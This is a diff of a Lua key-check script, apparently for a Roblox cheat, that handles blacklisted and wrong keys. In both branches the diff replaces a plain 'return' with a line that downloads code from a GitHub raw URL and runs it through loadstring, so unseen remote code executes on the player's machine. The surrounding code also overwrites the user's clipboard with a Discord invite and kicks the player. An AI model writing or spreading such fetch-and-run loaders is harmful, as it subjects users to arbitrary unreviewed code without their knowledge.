@@ -24,7 +24,7 @@ if wWvfweKxIJeY then
     warn("You Can't Use My Script With Blacklisted Key!")
     setclipboard("https://discord.gg/FcEGmkNDDe")
     game.Players.LocalPlayer:Kick("Your Used Key Has Been Permanently Blacklisted: https://discord.gg/FcEGmkNDDe") 
-    return
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
 elseif yWLyMncZYMEi then
     print("Your Key Is Correct.")  
     print("You Can Use My Script.")
@@ -33,5 +33,5 @@ else
     warn("You Can't Use My Script With Incorrect And Wrong Key!")
     setclipboard("https://discord.gg/FcEGmkNDDe")
     game.Players.LocalPlayer:Kick("Your Key Is Wrong: https://discord.gg/FcEGmkNDDe") 
-    return
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RISER93-ROBLOX/AfxcaxiRT1/refs/heads/main/Kicked"))()
 end
